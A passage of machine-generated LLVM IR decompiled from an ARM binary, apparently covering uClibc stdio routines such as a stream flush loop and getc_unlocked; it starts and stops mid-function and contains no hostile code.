  %v1_2bc5c = load i32, i32* @r7, align 4
  store i32 %v1_2bc5c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_2bc58, %bb69
  %v1_2bc60 = xor i1 %v9_2bc58, true
  call void @__pseudo_cond_branch(i1 %v1_2bc60, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2bc64 = load i32, i32* %r8.global-to-local, align 4
  %v1_2bc64 = load i32, i32* @r5, align 4
  %v2_2bc64 = add i32 %v1_2bc64, 64
  %v3_2bc64 = inttoptr i32 %v2_2bc64 to i32*
  store i32 %v0_2bc64, i32* %v3_2bc64, align 4
  %v0_2bc68.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2bc68

dec_label_pc_2bc68:                               ; preds = %dec_label_pc_2bc18, %bb70
  %v0_2bc68 = phi i32 [ %v0_2bc24, %dec_label_pc_2bc18 ], [ %v0_2bc68.pre, %bb70 ]
  %v1_2bc68 = add i32 %v0_2bc68, 60
  %v2_2bc68 = inttoptr i32 %v1_2bc68 to i32*
  %v3_2bc68 = load i32, i32* %v2_2bc68, align 4
  %v1_2bc6c = add i32 %v3_2bc68, 1
  store i32 %v1_2bc6c, i32* %r3.global-to-local, align 4
  store i32 %v1_2bc6c, i32* %v2_2bc68, align 4
  %v0_2bc74.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2bc74

dec_label_pc_2bc74:                               ; preds = %dec_label_pc_2bc08, %dec_label_pc_2bc68
  %v0_2bc8c = phi i32 [ %v0_2bc24, %dec_label_pc_2bc08 ], [ %v0_2bc74.pre, %dec_label_pc_2bc68 ]
  %v1_2bc74 = inttoptr i32 %v0_2bc8c to i16*
  %v2_2bc74 = load i16, i16* %v1_2bc74, align 2
  %v3_2bc74 = zext i16 %v2_2bc74 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_2bc7c = or i32 %v3_2bc74, %stack_var_-44.1
  %v1_2bc80 = xor i32 %v2_2bc7c, 320
  store i32 %v1_2bc80, i32* %r3.global-to-local, align 4
  %v1_2bc84 = and i32 %v1_2bc80, 832
  %v2_2bc84 = icmp eq i32 %v1_2bc84, 0
  br i1 %v2_2bc84, label %dec_label_pc_2bc8c, label %bb71

dec_label_pc_2bc8c:                               ; preds = %dec_label_pc_2bc74
  store i32 %v0_2bc8c, i32* @r0, align 4
  %v0_2bc90 = call i32 @__stdio_wcommit()
  store i32 %v0_2bc90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2bc94 = icmp eq i32 %v0_2bc90, 0
  br i1 %v2_2bc94, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_2bc8c
  %v1_2bc98 = load i32, i32* @r5, align 4
  %v2_2bc98 = inttoptr i32 %v1_2bc98 to i16*
  %v3_2bc98 = load i16, i16* %v2_2bc98, align 2
  %v4_2bc98 = zext i16 %v3_2bc98 to i32
  store i32 %v4_2bc98, i32* %r3.global-to-local, align 4
  %v2_2bc9c = add i32 %v1_2bc98, 8
  %v3_2bc9c = inttoptr i32 %v2_2bc9c to i32*
  %v4_2bc9c = load i32, i32* %v3_2bc9c, align 4
  store i32 %v4_2bc9c, i32* %r2.global-to-local, align 4
  %v2_2bca0 = and i32 %v4_2bc98, 65471
  store i32 %v2_2bca0, i32* %r3.global-to-local, align 4
  %v3_2bca4 = add i32 %v1_2bc98, 28
  %v4_2bca4 = inttoptr i32 %v3_2bca4 to i32*
  store i32 %v4_2bc9c, i32* %v4_2bca4, align 4
  %v1_2bca8 = load i32, i32* %r3.global-to-local, align 4
  %v2_2bca8 = trunc i32 %v1_2bca8 to i16
  %v3_2bca8 = load i32, i32* @r5, align 4
  %v4_2bca8 = inttoptr i32 %v3_2bca8 to i16*
  store i16 %v2_2bca8, i16* %v4_2bca8, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_2bc8c
  %v1_2bcac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_2bcac, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_2bc74, %.thread7
  %v0_2bcb0 = load i32, i32* @r6, align 4
  %v1_2bcb0 = load i32, i32* %sb.global-to-local, align 4
  %v2_2bcb0 = add i32 %v1_2bcb0, %v0_2bcb0
  %v3_2bcb0 = inttoptr i32 %v2_2bcb0 to i32*
  %v4_2bcb0 = load i32, i32* %v3_2bcb0, align 4
  store i32 %v4_2bcb0, i32* %r3.global-to-local, align 4
  %v1_2bcb4 = inttoptr i32 %v4_2bcb0 to i32*
  %v2_2bcb4 = load i32, i32* %v1_2bcb4, align 4
  store i32 %v2_2bcb4, i32* %r3.global-to-local, align 4
  %v2_2bcb8 = icmp ugt i32 %v2_2bcb4, 1
  store i1 %v2_2bcb8, i1* %cpsr_c.global-to-local, align 1
  %v7_2bcb8 = icmp eq i32 %v2_2bcb4, 2
  br i1 %v7_2bcb8, label %dec_label_pc_2bd34, label %dec_label_pc_2bcc0

dec_label_pc_2bcc0:                               ; preds = %bb71
  %v0_2bcc0 = load i32, i32* @r5, align 4
  %v1_2bcc0 = add i32 %v0_2bcc0, 60
  %v2_2bcc0 = inttoptr i32 %v1_2bcc0 to i32*
  %v3_2bcc0 = load i32, i32* %v2_2bcc0, align 4
  %v1_2bcc4 = add i32 %v3_2bcc0, -1
  store i32 %v1_2bcc4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2bcc8 = icmp eq i32 %v1_2bcc4, 0
  store i32 %v1_2bcc4, i32* %v2_2bcc0, align 4
  br i1 %v2_2bcc8, label %dec_label_pc_2bcd4, label %dec_label_pc_2bd34

dec_label_pc_2bcd4:                               ; preds = %dec_label_pc_2bcc0
  %v0_2bcd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_2bcd4 = load i32, i32* @r5, align 4
  %v2_2bcd4 = add i32 %v1_2bcd4, 64
  %v3_2bcd4 = inttoptr i32 %v2_2bcd4 to i32*
  store i32 %v0_2bcd4, i32* %v3_2bcd4, align 4
  %v0_2bcd8 = load i32, i32* @r5, align 4
  %v1_2bcd8 = add i32 %v0_2bcd8, 56
  store i32 %v1_2bcd8, i32* @r7, align 4
  br label %dec_label_pc_2bcdc

dec_label_pc_2bcdc:                               ; preds = %dec_label_pc_2bd0c.dec_label_pc_2bcdc_crit_edge, %dec_label_pc_2bcd4
  %v0_2bce4 = phi i32 [ %v0_2bce4.pre, %dec_label_pc_2bd0c.dec_label_pc_2bcdc_crit_edge ], [ %v1_2bcd8, %dec_label_pc_2bcd4 ]
  %v0_2bcdc = phi i32 [ %v0_2bcdc.pre, %dec_label_pc_2bd0c.dec_label_pc_2bcdc_crit_edge ], [ %v0_2bcd8, %dec_label_pc_2bcd4 ]
  %v1_2bcdc = add i32 %v0_2bcdc, 56
  %v2_2bcdc = inttoptr i32 %v1_2bcdc to i32*
  %v3_2bcdc = load i32, i32* %v2_2bcdc, align 4
  store i32 %v3_2bcdc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2bce4, i32* %r2.global-to-local, align 4
  %v1_2bce897 = inttoptr i32 %v0_2bce4 to i32*
  %v2_2bce898 = load i32, i32* %v1_2bce897, align 4
  store i32 %v2_2bce898, i32* %r3.global-to-local, align 4
  %v3_2bcec100 = icmp uge i32 %v2_2bce898, %v3_2bcdc
  store i1 %v3_2bcec100, i1* %cpsr_c.global-to-local, align 1
  %v9_2bcec106 = icmp eq i32 %v2_2bce898, %v3_2bcdc
  br i1 %v9_2bcec106, label %dec_label_pc_2bcf4, label %dec_label_pc_2bd0c

dec_label_pc_2bcf4:                               ; preds = %dec_label_pc_2bcdc, %dec_label_pc_2bcf4.dec_label_pc_2bce8_crit_edge
  %v0_2bcf4107 = phi i32 [ %v1_2bcec.pre, %dec_label_pc_2bcf4.dec_label_pc_2bce8_crit_edge ], [ %v3_2bcdc, %dec_label_pc_2bcdc ]
  store i32 %v0_2bcf4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2bd04 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2bd04, label %dec_label_pc_2bd08, label %dec_label_pc_2bcf4.dec_label_pc_2bce8_crit_edge

dec_label_pc_2bcf4.dec_label_pc_2bce8_crit_edge:  ; preds = %dec_label_pc_2bcf4
  %v0_2bce8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2bcec.pre = load i32, i32* @r4, align 4
  %v1_2bce8 = inttoptr i32 %v0_2bce8.pre to i32*
  %v2_2bce8 = load i32, i32* %v1_2bce8, align 4
  store i32 %v2_2bce8, i32* %r3.global-to-local, align 4
  %v3_2bcec = icmp uge i32 %v2_2bce8, %v1_2bcec.pre
  store i1 %v3_2bcec, i1* %cpsr_c.global-to-local, align 1
  %v9_2bcec = icmp eq i32 %v2_2bce8, %v1_2bcec.pre
  br i1 %v9_2bcec, label %dec_label_pc_2bcf4, label %dec_label_pc_2bd0c

dec_label_pc_2bd08:                               ; preds = %dec_label_pc_2bcf4
  %v0_2bd08 = load i32, i32* @r4, align 4
  store i32 %v0_2bd08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2bd0c

dec_label_pc_2bd0c:                               ; preds = %dec_label_pc_2bcdc, %dec_label_pc_2bcf4.dec_label_pc_2bce8_crit_edge, %dec_label_pc_2bd08
  %v0_2bd14 = phi i32 [ %v0_2bd08, %dec_label_pc_2bd08 ], [ %v2_2bce898, %dec_label_pc_2bcdc ], [ %v2_2bce8, %dec_label_pc_2bcf4.dec_label_pc_2bce8_crit_edge ]
  %v1_2bd0c = phi i32 [ %v0_2bd08, %dec_label_pc_2bd08 ], [ %v3_2bcdc, %dec_label_pc_2bcdc ], [ %v1_2bcec.pre, %dec_label_pc_2bcf4.dec_label_pc_2bce8_crit_edge ]
  %v3_2bd0c = icmp uge i32 %v0_2bd14, %v1_2bd0c
  store i1 %v3_2bd0c, i1* %cpsr_c.global-to-local, align 1
  %v9_2bd0c = icmp eq i32 %v0_2bd14, %v1_2bd0c
  br i1 %v9_2bd0c, label %dec_label_pc_2bd14, label %dec_label_pc_2bd0c.dec_label_pc_2bcdc_crit_edge

dec_label_pc_2bd0c.dec_label_pc_2bcdc_crit_edge:  ; preds = %dec_label_pc_2bd0c
  %v0_2bcdc.pre = load i32, i32* @r5, align 4
  %v0_2bce4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2bcdc

dec_label_pc_2bd14:                               ; preds = %dec_label_pc_2bd0c
  %v2_2bd14 = icmp ne i32 %v1_2bd0c, 0
  store i1 %v2_2bd14, i1* %cpsr_c.global-to-local, align 1
  %v7_2bd18 = icmp slt i32 %v1_2bd0c, 2
  br i1 %v7_2bd18, label %dec_label_pc_2bd34, label %dec_label_pc_2bd1c

dec_label_pc_2bd1c:                               ; preds = %dec_label_pc_2bd14
  %v0_2bd1c = load i32, i32* @r5, align 4
  %v1_2bd1c = add i32 %v0_2bd1c, 56
  store i32 %v1_2bd1c, i32* %r0.global-to-local, align 4
  %v0_2bd20 = load i32, i32* %r1.global-to-local, align 4
  %v1_2bd20 = add i32 %v0_2bd20, 129
  store i32 %v1_2bd20, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2bd34

dec_label_pc_2bd34:                               ; preds = %dec_label_pc_2bcc0, %dec_label_pc_2bd1c, %dec_label_pc_2bd14, %bb71, %dec_label_pc_2bbfc
  %v0_2bd34 = load i32, i32* @r5, align 4
  %v1_2bd34 = add i32 %v0_2bd34, 32
  %v2_2bd34 = inttoptr i32 %v1_2bd34 to i32*
  %v3_2bd34 = load i32, i32* %v2_2bd34, align 4
  store i32 %v3_2bd34, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2bd38 = icmp eq i32 %v3_2bd34, 0
  br i1 %v2_2bd38, label %dec_label_pc_2bd40, label %dec_label_pc_2bbfc

dec_label_pc_2bd40:                               ; preds = %dec_label_pc_2bd34, %dec_label_pc_2bbec
  %v0_2bd40 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_2bd40, i32* %r0.global-to-local, align 4
  %v0_2bd7c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_2bd48:                               ; preds = %dec_label_pc_2ba24
  %v3_2bd48 = load i16, i16* %arg1, align 2
  %v4_2bd48 = zext i16 %v3_2bd48 to i32
  %v1_2bd4c = and i32 %v4_2bd48, 64
  store i32 %v1_2bd4c, i32* %r3.global-to-local, align 4
  %v2_2bd4c = icmp eq i32 %v1_2bd4c, 0
  br i1 %v2_2bd4c, label %bb72, label %dec_label_pc_2bd58

bb72:                                             ; preds = %dec_label_pc_2bd48
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_2bd58:                               ; preds = %dec_label_pc_2bd48
  %v0_2bd58 = call i32 @__stdio_wcommit()
  store i32 %v0_2bd58, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2bd5c = icmp eq i32 %v0_2bd58, 0
  br i1 %v2_2bd5c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_2bd58
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_2bd58
  %v1_2bd60 = load i32, i32* @r4, align 4
  %v2_2bd60 = inttoptr i32 %v1_2bd60 to i16*
  %v3_2bd60 = load i16, i16* %v2_2bd60, align 2
  %v4_2bd60 = zext i16 %v3_2bd60 to i32
  store i32 %v4_2bd60, i32* %r3.global-to-local, align 4
  %v2_2bd64 = add i32 %v1_2bd60, 8
  %v3_2bd64 = inttoptr i32 %v2_2bd64 to i32*
  %v4_2bd64 = load i32, i32* %v3_2bd64, align 4
  store i32 %v4_2bd64, i32* %r2.global-to-local, align 4
  %v2_2bd68 = and i32 %v4_2bd60, 65471
  store i32 %v2_2bd68, i32* %r3.global-to-local, align 4
  %v2_2bd6c = trunc i32 %v2_2bd68 to i16
  store i16 %v2_2bd6c, i16* %v2_2bd60, align 2
  %v1_2bd70 = load i32, i32* %r2.global-to-local, align 4
  %v2_2bd70 = load i32, i32* @r4, align 4
  %v3_2bd70 = add i32 %v2_2bd70, 28
  %v4_2bd70 = inttoptr i32 %v3_2bd70 to i32*
  store i32 %v1_2bd70, i32* %v4_2bd70, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_2bd40, %.thread14
  %v0_2bd7c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_2bd7c.pre, %dec_label_pc_2bd40 ], [ 0, %.thread14 ]
  store i32 %v0_2bd7c, i32* %r0.global-to-local, align 4
  store i32 %v6_2b9f8, i32* %r5.global-to-local, align 4
  ret i32 %v0_2bd7c

; uselistorder directives
  uselistorder i32 %v0_2bd7c, { 1, 0 }
  uselistorder i32 %v3_2bd34, { 1, 2, 0 }
  uselistorder i32 %v0_2bd08, { 1, 0, 2 }
  uselistorder i32 %v1_2bcec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2bc54, { 1, 0, 2 }
  uselistorder i32 %v1_2bc38.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_2bc1c, { 1, 0 }
  uselistorder i32 %v0_2bbc0, { 1, 0, 2 }
  uselistorder i32 %v1_2bba4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2bb94, { 1, 0 }
  uselistorder i32 %v0_2bb58, { 1, 0, 2 }
  uselistorder i32 %v1_2bb3c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_2bb24, { 1, 0 }
  uselistorder i32 %v0_2baec, { 1, 0, 2 }
  uselistorder i32 %v1_2bad0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2bac0, { 1, 0 }
  uselistorder i32 %v0_2ba7c, { 1, 0, 2 }
  uselistorder i32 %v1_2ba60.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_2ba38, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 12, 11, 1, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 0, 25, 26, 27, 28, 29, 30, 32, 31, 2, 33, 34, 35, 36, 38, 37, 3, 39, 40, 41, 42, 44, 43, 4, 45, 46, 47, 48, 50, 49, 5, 51, 52, 55, 53, 54 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i1* %cpsr_c.global-to-local, { 7, 20, 8, 9, 11, 10, 2, 12, 13, 14, 15, 17, 16, 1, 18, 19, 0, 21, 22, 24, 23, 3, 25, 26, 28, 27, 4, 29, 30, 31, 33, 32, 5, 34, 35, 37, 36, 6, 38, 39, 40 }
  uselistorder i32 168, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 11, 13, 12, 14, 17, 15, 18, 16, 19, 0, 20 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_2bd34, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_2bd0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2bcf4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2bc74, { 1, 0 }
  uselistorder label %dec_label_pc_2bc68, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_2bc58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2bc40, { 1, 0 }
  uselistorder label %dec_label_pc_2bbfc, { 1, 0 }
  uselistorder label %dec_label_pc_2bbecthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_2bbc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2bbac, { 1, 0 }
  uselistorder label %dec_label_pc_2bb6c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_2bb5c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2bb44, { 1, 0 }
  uselistorder label %dec_label_pc_2bb18, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2baf0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2bad8, { 1, 0 }
  uselistorder label %dec_label_pc_2ba90, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_2ba80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2ba68, { 1, 0 }
  uselistorder label %dec_label_pc_2ba34, { 1, 0 }
}

define i32 @function_2bd90(i16* %arg1) local_unnamed_addr {
dec_label_pc_2bd90:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_2bd90 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2bd90, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_2bd90
  %v2_2bd90 = load i32, i32* @r8, align 4
  %v8_2bd90 = ashr i32 %v2_2bd90, %tmp
  %v9_2bd90 = and i32 %v8_2bd90, %tmp
  %v2_2bd94 = trunc i32 %v9_2bd90 to i16
  %v4_2bd94 = inttoptr i32 %v9_2bd90 to i16*
  store i16 %v2_2bd94, i16* %v4_2bd94, align 2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_2bd90, %bb
  %v5_2bda0 = phi i32 [ %tmp, %dec_label_pc_2bd90 ], [ 0, %bb ]
  ret i32 %v5_2bda0

; uselistorder directives
  uselistorder i32 %v9_2bd90, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_2bda4 = load i32, i32* @r4, align 4
  store i32 %v3_2bda4, i32* %stack_var_-12, align 4
  %v6_2bda4 = load i32, i32* @r5, align 4
  %v9_2bda4 = load i32, i32* @lr, align 4
  %v0_2bda8 = load i32, i32* @r0, align 4
  %v1_2bda8 = add i32 %v0_2bda8, 16
  %v2_2bda8 = inttoptr i32 %v1_2bda8 to i32*
  %v3_2bda8 = load i32, i32* %v2_2bda8, align 4
  store i32 %v3_2bda8, i32* %r2.global-to-local, align 4
  %v1_2bdac = add i32 %v0_2bda8, 24
  %v2_2bdac = inttoptr i32 %v1_2bdac to i32*
  %v3_2bdac = load i32, i32* %v2_2bdac, align 4
  %v3_2bdb0 = icmp ult i32 %v3_2bda8, %v3_2bdac
  store i32 %v0_2bda8, i32* @r4, align 4
  br i1 %v3_2bdb0, label %bb, label %dec_label_pc_2bdd0

bb:                                               ; preds = %entry
  %v2_2bdbc = inttoptr i32 %v3_2bda8 to i8*
  %v3_2bdbc = load i8, i8* %v2_2bdbc, align 1
  %v4_2bdbc = zext i8 %v3_2bdbc to i32
  store i32 %v4_2bdbc, i32* %r0.global-to-local, align 4
  %v6_2bdbc = add i32 %v3_2bda8, 1
  store i32 %v6_2bdbc, i32* %r2.global-to-local, align 4
  store i32 %v6_2bdbc, i32* %v2_2bda8, align 4
  br label %dec_label_pc_2bebc

dec_label_pc_2bdd0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r5, align 4
  %v1_2bdd0 = inttoptr i32 %v0_2bda8 to i16*
  %v2_2bdd0 = load i16, i16* %v1_2bdd0, align 2
  %v3_2bdd0 = zext i16 %v2_2bdd0 to i32
  %v1_2bdd4 = and i32 %v3_2bdd0, 131
  %tmp25 = icmp ugt i32 %v1_2bdd4, 128
  br i1 %tmp25, label %dec_label_pc_2bdf0, label %dec_label_pc_2bde0

dec_label_pc_2bde0:                               ; preds = %dec_label_pc_2bdd0
  store i32 128, i32* @r1, align 4
  %v0_2bde4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_2bde4, i32* %r0.global-to-local, align 4
  %v2_2bde8 = icmp eq i32 %v0_2bde4, 0
  br i1 %v2_2bde8, label %dec_label_pc_2bde0.dec_label_pc_2bdf0_crit_edge, label %dec_label_pc_2beb8

dec_label_pc_2bde0.dec_label_pc_2bdf0_crit_edge:  ; preds = %dec_label_pc_2bde0
  %v0_2bdf0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2bdf0

dec_label_pc_2bdf0:                               ; preds = %dec_label_pc_2bde0.dec_label_pc_2bdf0_crit_edge, %dec_label_pc_2bdd0
  %v2_2be30 = phi i32 [ %v0_2bdf0.pre, %dec_label_pc_2bde0.dec_label_pc_2bdf0_crit_edge ], [ %v0_2bda8, %dec_label_pc_2bdd0 ]
  %v1_2bdf0 = inttoptr i32 %v2_2be30 to i16*
  %v2_2bdf0 = load i16, i16* %v1_2bdf0, align 2
  %v3_2bdf0 = zext i16 %v2_2bdf0 to i32
  store i32 %v3_2bdf0, i32* %r2.global-to-local, align 4
  %v1_2bdf4 = and i32 %v3_2bdf0, 2
  %v2_2bdf4 = icmp eq i32 %v1_2bdf4, 0
  br i1 %v2_2bdf4, label %dec_label_pc_2be20, label %dec_label_pc_2bdfc

dec_label_pc_2bdfc:                               ; preds = %dec_label_pc_2bdf0
  %tmp26 = urem i16 %v2_2bdf0, 2
  %v1_2bdfc = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_2bdfc
  %v4_2be00 = and i32 %tmp22, 4
  %v5_2be00 = add i32 %v4_2be00, %v2_2be30
  %v1_2be04 = add i32 %v5_2be00, 36
  %v2_2be04 = inttoptr i32 %v1_2be04 to i8*
  %v3_2be04 = load i8, i8* %v2_2be04, align 1
  %v4_2be04 = zext i8 %v3_2be04 to i32
  %v1_2be08 = add nsw i32 %v3_2bdf0, -1
  store i32 %v1_2be08, i32* %r2.global-to-local, align 4
  store i32 %v4_2be04, i32* %r0.global-to-local, align 4
  %v2_2be14 = add i32 %v2_2be30, 40
  %v3_2be14 = inttoptr i32 %v2_2be14 to i32*
  store i32 0, i32* %v3_2be14, align 4
  %v0_2be18 = load i32, i32* %r2.global-to-local, align 4
  %v1_2be18 = trunc i32 %v0_2be18 to i16
  %v2_2be18 = load i32, i32* @r4, align 4
  %v3_2be18 = inttoptr i32 %v2_2be18 to i16*
  store i16 %v1_2be18, i16* %v3_2be18, align 2
  br label %dec_label_pc_2bebc

dec_label_pc_2be20:                               ; preds = %dec_label_pc_2bdf0
  %v1_2be20 = add i32 %v2_2be30, 16
  %v1_2be24 = inttoptr i32 %v1_2be20 to i32*
  %v2_2be24 = load i32, i32* %v1_2be24, align 4
  %v3_2be24 = add i32 %v2_2be30, 20
  %v4_2be24 = inttoptr i32 %v3_2be24 to i32*
  %v5_2be24 = load i32, i32* %v4_2be24, align 4
  %v9_2be28 = icmp eq i32 %v5_2be24, %v2_2be24
  br i1 %v9_2be28, label %dec_label_pc_2be38, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2be20
  %v2_2be2c = inttoptr i32 %v2_2be24 to i8*
  %v3_2be2c = load i8, i8* %v2_2be2c, align 1
  %v4_2be2c = zext i8 %v3_2be2c to i32
  store i32 %v4_2be2c, i32* %r0.global-to-local, align 4
  %v6_2be2c = add i32 %v2_2be24, 1
  store i32 %v6_2be2c, i32* %v1_2be24, align 4
  br label %dec_label_pc_2bebc

dec_label_pc_2be38:                               ; preds = %dec_label_pc_2be20
  %v1_2be38 = add i32 %v2_2be30, 4
  %v2_2be38 = inttoptr i32 %v1_2be38 to i32*
  %v3_2be38 = load i32, i32* %v2_2be38, align 4
  %v7_2be3c = icmp eq i32 %v3_2be38, -2
  br i1 %v7_2be3c, label %.thread7, label %dec_label_pc_2be50

.thread7:                                         ; preds = %dec_label_pc_2be38
  %v2_2be40 = or i16 %v2_2bdf0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_2be40, i16* %v1_2bdf0, align 2
  br label %dec_label_pc_2bebc

dec_label_pc_2be50:                               ; preds = %dec_label_pc_2be38
  %v1_2be50 = and i32 %v3_2bdf0, 768
  %v2_2be50 = icmp eq i32 %v1_2be50, 0
  br i1 %v2_2be50, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_2be50
  %v1_2be58 = load i32, i32* @r5, align 4
  %v3_2be58 = add i32 %v1_2be58, 88
  %v4_2be58 = inttoptr i32 %v3_2be58 to i32*
  %v5_2be58 = load i32, i32* %v4_2be58, align 4
  store i32 %v5_2be58, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_2be50, %bb23
  store i32 179808, i32* @lr, align 4
  %v1_2be5c = xor i1 %v2_2be50, true
  call void @__pseudo_cond_branch(i1 %v1_2be5c, i32 ptrtoint (i32* @global_var_2b9f8.3418 to i32))
  %v0_2be60 = load i32, i32* @r4, align 4
  %v1_2be60 = add i32 %v0_2be60, 8
  store i32 %v1_2be60, i32* %r2.global-to-local, align 4
  %v1_2be64 = inttoptr i32 %v1_2be60 to i32*
  %v2_2be64 = load i32, i32* %v1_2be64, align 4
  store i32 %v2_2be64, i32* %r2.global-to-local, align 4
  %v3_2be64 = add i32 %v0_2be60, 12
  %v4_2be64 = inttoptr i32 %v3_2be64 to i32*
  %v5_2be64 = load i32, i32* %v4_2be64, align 4
  %v9_2be68 = icmp eq i32 %v5_2be64, %v2_2be64
  br i1 %v9_2be68, label %dec_label_pc_2be9c, label %dec_label_pc_2be70

dec_label_pc_2be70:                               ; preds = %.thread9
  %v2_2be70 = add i32 %v0_2be60, 24
  %v3_2be70 = inttoptr i32 %v2_2be70 to i32*
  store i32 %v2_2be64, i32* %v3_2be70, align 4
  %v0_2be74 = load i32, i32* @r4, align 4
  store i32 %v0_2be74, i32* %r0.global-to-local, align 4
  %v2_2be78 = call i32 @__stdio_rfill(i32 %v0_2be74)
  store i32 %v2_2be78, i32* %r0.global-to-local, align 4
  %v2_2be7c = icmp eq i32 %v2_2be78, 0
  br i1 %v2_2be7c, label %dec_label_pc_2beb8, label %dec_label_pc_2be84

dec_label_pc_2be84:                               ; preds = %dec_label_pc_2be70
  %v0_2be84 = load i32, i32* @r4, align 4
  %v1_2be84 = add i32 %v0_2be84, 20
  %v2_2be84 = inttoptr i32 %v1_2be84 to i32*
  %v3_2be84 = load i32, i32* %v2_2be84, align 4
  %v2_2be88 = add i32 %v0_2be84, 24
  %v3_2be88 = inttoptr i32 %v2_2be88 to i32*
  store i32 %v3_2be84, i32* %v3_2be88, align 4
  %v0_2be8c = load i32, i32* @r4, align 4
  %v1_2be8c = add i32 %v0_2be8c, 16
  %v2_2be8c = inttoptr i32 %v1_2be8c to i32*
  %v3_2be8c = load i32, i32* %v2_2be8c, align 4
  %v1_2be90 = inttoptr i32 %v3_2be8c to i8*
  %v2_2be90 = load i8, i8* %v1_2be90, align 1
  %v3_2be90 = zext i8 %v2_2be90 to i32
  store i32 %v3_2be90, i32* %r0.global-to-local, align 4
